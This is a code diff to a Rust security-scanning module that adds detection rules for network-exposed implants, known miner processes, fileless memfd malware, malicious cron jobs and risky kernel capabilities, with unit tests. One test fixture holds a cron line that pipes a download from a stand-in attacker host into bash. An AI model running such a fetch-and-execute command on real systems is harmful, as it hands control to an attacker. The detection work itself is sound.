@@ -1,4 +1,4 @@
-use crate::models::AgentReport;
+use crate::models::{AgentReport, CronSeverity};
 
 // ── Legacy constants (kept for backward compatibility) ─────
 
@@ -22,7 +22,7 @@ pub const RISK_CONTAINER_RESTART_LOOP: u8 = 5;
 pub const RISK_CONTAINER_UNHEALTHY: u8 = 10;
 pub const RESTART_LOOP_THRESHOLD: u64 = 3;
 
-pub const SCORING_VERSION: u8 = 5;
+pub const SCORING_VERSION: u8 = 7;
 
 // ── New Finding model (v0.5) ───────────────────────────────
 
@@ -281,10 +281,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     let mut shadow_it_ports = Vec::new();
     for port in &report.network.listening_ports {
         if let Some(exe) = &port.exe_path
-            && (exe.starts_with("/tmp/")
-                || exe.starts_with("/var/tmp/")
-                || exe.starts_with("/dev/shm/")
-                || exe.starts_with("/home/"))
+            && crate::utils::is_ephemeral_exec_path(exe)
         {
             shadow_it_ports.push(format!("{}/{} ({})", port.port, port.protocol, exe));
         }
@@ -303,6 +300,156 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             ),
             suppressed: None,
             cis_ref: None,
+        });
+    }
+
+    // ── SEC-015 — IoC: privileged non-root implant reachable on the network ──
+    {
+        let mut ioc_evidence: Vec<String> = Vec::new();
+        for port in &report.network.listening_ports {
+            if !crate::utils::is_wildcard_bind(&port.bind_address) {
+                continue;
+            }
+            let Some(exe) = port.exe_path.as_deref() else {
+                continue;
+            };
+            if !crate::utils::is_ephemeral_exec_path(exe) {
+                continue;
+            }
+            let Some(pid) = port.pid else {
+                continue;
+            };
+            let Some(cap) = report
+                .security
+                .capability_audit
+                .iter()
+                .find(|c| c.pid == pid)
+            else {
+                continue;
+            };
+
+            ioc_evidence.push(format!(
+                "pid {} ({}) exe {} listening on {} holds [{}]",
+                cap.pid,
+                cap.comm,
+                exe,
+                port.bind_address,
+                cap.critical_caps.join(", ")
+            ));
+        }
+
+        if !ioc_evidence.is_empty() {
+            findings.push(Finding {
+                id: "SEC-015",
+                title: "ACTIVE COMPROMISE: privileged non-root process on ephemeral path listening on network"
+                    .to_string(),
+                category: Category::Security,
+                weight: 60,
+                evidence: format!(
+                    "{} reachable implant(s): {}",
+                    ioc_evidence.len(),
+                    ioc_evidence.join("; ")
+                ),
+                suppressed: None,
+                cis_ref: None,
+            });
+        }
+    }
+
+    // ── SEC-016 — known malware/miner processes (name-recognized subset) ──
+    // Filter by name: the sweep vector now also holds name-independent fileless
+    // entries (SEC-017), which must NOT be mislabeled "known malicious" here.
+    let name_hits: Vec<&crate::models::SuspiciousProcess> = report
+        .security
+        .suspicious_processes
+        .iter()
+        .filter(|p| {
+            crate::utils::is_known_malware(&p.name) || crate::utils::is_ambiguous_malware(&p.name)
+        })
+        .collect();
+    if !name_hits.is_empty() {
+        let list = name_hits
+            .iter()
+            .map(|p| match &p.exe_path {
+                Some(exe) => format!("{} (pid {}, {})", p.name, p.pid, exe),
+                None => format!("{} (pid {})", p.name, p.pid),
+            })
+            .collect::<Vec<_>>()
+            .join(", ");
+        findings.push(Finding {
+            id: "SEC-016",
+            title: "ACTIVE COMPROMISE: known malicious process detected".to_string(),
+            category: Category::Security,
+            weight: 60,
+            evidence: format!("{} known-bad process(es): {}", name_hits.len(), list),
+            suppressed: None,
+            cis_ref: None,
+        });
+    }
+
+    // ── SEC-017 — fileless malware executing from an ephemeral path ──
+    // is_deleted is already FP-protected upstream (deleted AND ephemeral base),
+    // so a system-path deletion from apt upgrade never reaches here.
+    let fileless: Vec<&crate::models::SuspiciousProcess> = report
+        .security
+        .suspicious_processes
+        .iter()
+        .filter(|p| p.is_deleted)
+        .collect();
+    if !fileless.is_empty() {
+        let list = fileless
+            .iter()
+            .map(|p| match &p.exe_path {
+                Some(exe) => {
+                    if exe.starts_with("/memfd:") {
+                        format!("{} (pid {}, executing in-memory (memfd))", p.name, p.pid)
+                    } else {
+                        format!("{} (pid {}, deleted from {})", p.name, p.pid, exe)
+                    }
+                }
+                None => format!("{} (pid {}, deleted)", p.name, p.pid),
+            })
+            .collect::<Vec<_>>()
+            .join(", ");
+        findings.push(Finding {
+            id: "SEC-017",
+            title: "ACTIVE COMPROMISE: fileless malware executing from ephemeral path".to_string(),
+            category: Category::Security,
+            weight: 60,
+            evidence: format!("{} fileless process(es): {}", fileless.len(), list),
+            suppressed: None,
+            cis_ref: None,
+        });
+    }
+
+    // ── SEC-018 – Malicious cron job detected ────────────────
+    // (formerly SEC-017; renumbered to avoid conflict with fileless detection)
+    if let Some(_critical) = report
+        .host
+        .cron_jobs
+        .iter()
+        .find(|c| c.severity == CronSeverity::Critical)
+    {
+        let critical_jobs: Vec<&str> = report
+            .host
+            .cron_jobs
+            .iter()
+            .filter(|c| c.severity == CronSeverity::Critical)
+            .map(|c| c.command.as_str())
+            .collect();
+
+        findings.push(Finding {
+            id: "SEC-018",
+            title: "Suspicious cron job detected (possible persistence)".to_string(),
+            category: Category::Security,
+            weight: 20,
+            evidence: format!(
+                "{} suspicious cron job(s): {}",
+                critical_jobs.len(),
+                critical_jobs.join("; ")
+            ),
+            suppressed: None,
+            cis_ref: Some("CIS 5.1.8"),
         });
     }
 
@@ -333,6 +480,71 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 report.security.secret_hygiene.len(),
                 evidence_str
             ),
+            suppressed: None,
+            cis_ref: None,
+        });
+    }
+
+    // ── Non-root processes with critical kernel capabilities ──
+    if !report.security.capability_audit.is_empty() {
+        let n = report.security.capability_audit.len();
+        let nnp_open = report
+            .security
+            .capability_audit
+            .iter()
+            .filter(|f| f.no_new_privs == Some(false))
+            .count();
+
+        let ports = &report.network.listening_ports;
+        let (listening, exposed) =
+            report
+                .security
+                .capability_audit
+                .iter()
+                .fold((0usize, 0usize), |(l, e), f| {
+                    let pid = Some(f.pid);
+                    let mut on_net = false;
+                    let mut global = false;
+                    for p in ports {
+                        if p.pid == pid {
+                            on_net = true;
+                            if crate::utils::is_wildcard_bind(&p.bind_address) {
+                                global = true;
+                                break;
+                            }
+                        }
+                    }
+                    (l + on_net as usize, e + global as usize)
+                });
+
+        let mut evidence = format!(
+            "{n} non-root process(es) with SYS_ADMIN/SYS_PTRACE/DAC_OVERRIDE/NET_RAW or ambient capability sets"
+        );
+        if nnp_open > 0 {
+            evidence.push_str(&format!(
+                "; {nnp_open} of them with NoNewPrivs=0 — setuid execve escalation path open"
+            ));
+        }
+        if listening > 0 {
+            if exposed > 0 {
+                evidence.push_str(&format!(
+                    "; WARNING: {listening} of these listening on the network ({exposed} exposed globally on 0.0.0.0/::)"
+                ));
+            } else {
+                evidence.push_str(&format!(
+                    "; WARNING: {listening} of these listening on the network (none exposed globally)"
+                ));
+            }
+        }
+
+        let weight = if exposed > 0 { 20 } else { 8 };
+
+        findings.push(Finding {
+            id: "CAP-001",
+            title: "Non-root processes hold critical kernel capabilities".to_string(),
+            category: Category::Security,
+            weight,
+            evidence,
             suppressed: None,
             cis_ref: None,
         });
@@ -785,5 +997,234 @@ mod tests {
                 .all(|f| !f.evidence.contains("cache"))
         );
         assert!(score(findings).reliability <= 30);
+    }
+
+    #[test]
+    fn cap001_weight_escalates_on_global_exposure() {
+        use crate::models::{PortInfo, ProcCapFinding};
+        let mut r = minimal_report();
+        r.security.capability_audit = vec![ProcCapFinding {
+            pid: 4242,
+            comm: "nginx".into(),
+            euid: 101,
+            effective: 0xa804_25fb,
+            permitted: 0xa804_25fb,
+            inheritable: 0,
+            bounding: 0xa804_25fb,
+            ambient: 0,
+            no_new_privs: Some(false),
+            seccomp: Some(2),
+            critical_caps: vec!["CAP_NET_RAW".into()],
+        }];
+        r.network.listening_ports = vec![PortInfo {
+            protocol: "tcp".into(),
+            port: "8080".into(),
+            process: "nginx".into(),
+            bind_address: "0.0.0.0".into(),
+            pid: Some(4242),
+            exe_path: None,
+        }];
+        let cap = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "CAP-001")
+            .expect("CAP-001 present");
+        assert_eq!(cap.weight, 20);
+        assert!(cap.evidence.contains("1 exposed globally"));
+
+        // Same finding, but bound to loopback → no escalation, weight stays 8.
+        r.network.listening_ports[0].bind_address = "127.0.0.1".into();
+        let cap = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "CAP-001")
+            .unwrap();
+        assert_eq!(cap.weight, 8);
+        assert!(cap.evidence.contains("1 of these listening"));
+        assert!(!cap.evidence.contains("exposed globally on"));
+
+        // IPv4-mapped IPv6 wildcard must count as global exposure too.
+        r.network.listening_ports[0].bind_address = "::ffff:0.0.0.0".into();
+        let cap = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "CAP-001")
+            .unwrap();
+        assert_eq!(cap.weight, 20);
+    }
+
+    #[test]
+    fn sec015_fires_only_on_full_ioc_triad() {
+        use crate::models::{PortInfo, ProcCapFinding};
+        let cap = |pid| ProcCapFinding {
+            pid,
+            comm: "kdevtmpfsi".into(),
+            euid: 1000,
+            effective: 0x20_0000,
+            permitted: 0x20_0000,
+            inheritable: 0,
+            bounding: 0x20_0000,
+            ambient: 0,
+            no_new_privs: Some(false),
+            seccomp: Some(0),
+            critical_caps: vec!["CAP_SYS_ADMIN".into()],
+        };
+        let port = |bind: &str, exe: Option<&str>, pid| PortInfo {
+            protocol: "tcp".into(),
+            port: "31337".into(),
+            process: "x".into(),
+            bind_address: bind.into(),
+            pid,
+            exe_path: exe.map(Into::into),
+        };
+        let fires = |r: &AgentReport| evaluate(r).iter().any(|f| f.id == "SEC-015");
+
+        // Full triad → fires, weight 60, evidence carries pid/exe/caps.
+        let mut r = minimal_report();
+        r.security.capability_audit = vec![cap(4242)];
+        r.network.listening_ports = vec![port("0.0.0.0", Some("/tmp/kdevtmpfsi"), Some(4242))];
+        assert!(fires(&r));
+        let f = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "SEC-015")
+            .unwrap();
+        assert_eq!(f.weight, 60);
+        assert!(f.evidence.contains("4242"));
+        assert!(f.evidence.contains("/tmp/kdevtmpfsi"));
+        assert!(f.evidence.contains("CAP_SYS_ADMIN"));
+
+        // Each missing leg suppresses the IoC:
+        r.network.listening_ports = vec![port("127.0.0.1", Some("/tmp/kdevtmpfsi"), Some(4242))];
+        assert!(!fires(&r), "loopback bind is not reachable");
+        r.network.listening_ports = vec![port("0.0.0.0", Some("/usr/bin/nginx"), Some(4242))];
+        assert!(!fires(&r), "system path is not ephemeral");
+        r.network.listening_ports = vec![port("0.0.0.0", Some("/tmp/kdevtmpfsi"), Some(9999))];
+        assert!(
+            !fires(&r),
+            "pid absent from capability_audit is only SEC-013"
+        );
+
+        // Mapped wildcard counts too (shares is_wildcard_bind contract).
+        r.network.listening_ports = vec![port("::ffff:0.0.0.0", Some("/dev/shm/x"), Some(4242))];
+        assert!(fires(&r));
+    }
+
+    #[test]
+    fn sec016_reads_suspicious_processes() {
+        use crate::models::SuspiciousProcess;
+        let mut r = minimal_report();
+        r.security.suspicious_processes = vec![SuspiciousProcess {
+            pid: 1337,
+            name: "xmrig".into(),
+            exe_path: Some("/tmp/xmrig".into()),
+            ..Default::default()
+        }];
+        let f = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "SEC-016")
+            .unwrap();
+        assert_eq!(f.weight, 60);
+        assert!(
+            f.evidence.contains("xmrig")
+                && f.evidence.contains("1337")
+                && f.evidence.contains("/tmp/xmrig")
+        );
+
+        let clean = minimal_report();
+        assert!(!evaluate(&clean).iter().any(|f| f.id == "SEC-016"));
+    }
+
+    #[test]
+    fn sec017_flags_fileless_and_sec016_excludes_it() {
+        use crate::models::SuspiciousProcess;
+        let mut r = minimal_report();
+        r.security.suspicious_processes = vec![
+            // fileless, name NOT in blocklist → SEC-017 only
+            SuspiciousProcess {
+                pid: 42,
+                name: "obfuscated".into(),
+                exe_path: Some("/dev/shm/loader".into()),
+                is_deleted: true,
+            },
+            // known miner, live → SEC-016 only
+            SuspiciousProcess {
+                pid: 7,
+                name: "xmrig".into(),
+                exe_path: Some("/tmp/xmrig".into()),
+                is_deleted: false,
+            },
+        ];
+        let ids: Vec<&str> = evaluate(&r).iter().map(|f| f.id).collect();
+        assert!(ids.contains(&"SEC-016"));
+        assert!(ids.contains(&"SEC-017"));
+
+        let sec016 = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "SEC-016")
+            .unwrap();
+        assert!(sec016.evidence.contains("xmrig"));
+        assert!(
+            !sec016.evidence.contains("obfuscated"),
+            "fileless non-name must not be in SEC-016"
+        );
+        let sec017 = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "SEC-017")
+            .unwrap();
+        assert!(
+            sec017.evidence.contains("obfuscated") && sec017.evidence.contains("/dev/shm/loader")
+        );
+        assert!(
+            !sec017.evidence.contains("xmrig"),
+            "live miner must not be in SEC-017"
+        );
+    }
+
+    #[test]
+    fn sec017_evidence_distinguishes_memfd_from_ondisk() {
+        use crate::models::SuspiciousProcess;
+        let mut r = minimal_report();
+        r.security.suspicious_processes = vec![
+            // обычный fileless: удалённый файл из /tmp
+            SuspiciousProcess {
+                pid: 10,
+                name: "malware".into(),
+                exe_path: Some("/tmp/malware".into()),
+                is_deleted: true,
+            },
+            // memfd-процесс
+            SuspiciousProcess {
+                pid: 20,
+                name: "stealth".into(),
+                exe_path: Some("/memfd:stealth".into()),
+                is_deleted: true,
+            },
+        ];
+        let sec017 = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "SEC-017")
+            .unwrap();
+        assert!(sec017.evidence.contains("deleted from /tmp/malware"));
+        assert!(sec017.evidence.contains("executing in-memory (memfd)"));
+        assert!(!sec017.evidence.contains("deleted from /memfd:stealth"));
+    }
+
+    #[test]
+    fn sec018_detects_critical_cron() {
+        use crate::models::{CronJob, CronSeverity};
+        let mut r = minimal_report();
+        r.host.cron_jobs = vec![
+            CronJob {
+                command: "0 3 * * * root /usr/bin/backup".into(),
+                severity: CronSeverity::Ok,
+            },
+            CronJob {
+                command: "* * * * * root curl http://evil.com | bash -c".into(),
+                severity: CronSeverity::Critical,
+            },
+        ];
+        let f = evaluate(&r)
+            .into_iter()
+            .find(|f| f.id == "SEC-018")
+            .expect("SEC-018 missing");
+        assert_eq!(f.weight, 20);
+        assert!(f.evidence.contains("curl"));
     }
 }
